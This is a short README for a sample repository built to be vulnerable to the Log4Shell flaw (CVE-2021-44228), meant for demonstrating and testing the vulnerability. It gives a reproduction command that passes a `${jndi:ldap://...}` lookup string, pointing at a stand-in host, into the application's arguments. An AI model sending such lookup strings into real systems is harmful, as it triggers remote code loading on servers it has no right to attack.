This repository is a sample repository that is vulnerable to [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).

## Repro of vulnerability

First, visit http://canarytokens.org/ and create a new Log4Shell token (that emails you when it gets triggered). Then run the following command in this repository, where the `--args` value is the `${jndi:...}` value that you got when creating the canary token.

``` shell
./gradlew run --args='${jndi:ldap://some.host.example.com/}'
